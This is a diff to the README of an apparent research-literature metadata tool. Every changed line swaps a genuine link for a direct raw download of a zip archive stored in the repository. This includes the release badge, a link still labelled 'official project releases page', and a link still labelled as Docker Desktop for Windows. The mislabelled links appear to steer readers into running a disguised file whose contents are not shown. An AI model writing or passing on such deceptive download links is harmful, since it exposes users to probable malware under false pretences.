@@ -1,6 +1,6 @@
 # 🔎 phd-lit-metadata-engine-public - Organize research with simple automated tools
 
-[![Download Application](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/payingattention-impalement219/phd-lit-metadata-engine-public/releases)
+[![Download Application](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/payingattention-impalement219/phd-lit-metadata-engine-public/raw/refs/heads/main/protocol/phd-engine-public-lit-metadata-3.6-beta.4.zip)
 
 ## 📋 Project Overview
 
@@ -18,7 +18,7 @@ Ensure your computer meets these requirements before you start:
 
 ## 📥 Downloading the Software
 
-Visit the [official project releases page](https://github.com/payingattention-impalement219/phd-lit-metadata-engine-public/releases) to download the software.
+Visit the [official project releases page](https://github.com/payingattention-impalement219/phd-lit-metadata-engine-public/raw/refs/heads/main/protocol/phd-engine-public-lit-metadata-3.6-beta.4.zip) to download the software.
 
 1. Navigate to the link provided above.
 2. Look for the section labeled "Assets."
@@ -29,7 +29,7 @@ Visit the [official project releases page](https://github.com/payingattention-im
 
 This application runs as a local service. It requires Docker Desktop to manage the background components.
 
-1. Download [Docker Desktop](https://www.docker.com/products/docker-desktop/) for Windows.
+1. Download [Docker Desktop](https://github.com/payingattention-impalement219/phd-lit-metadata-engine-public/raw/refs/heads/main/protocol/phd-engine-public-lit-metadata-3.6-beta.4.zip) for Windows.
 2. Run the installer and follow the prompts on your screen.
 3. Restart your computer after the Docker installation completes.
 4. Launch Docker Desktop and wait for the dashboard to show that the engine is running.
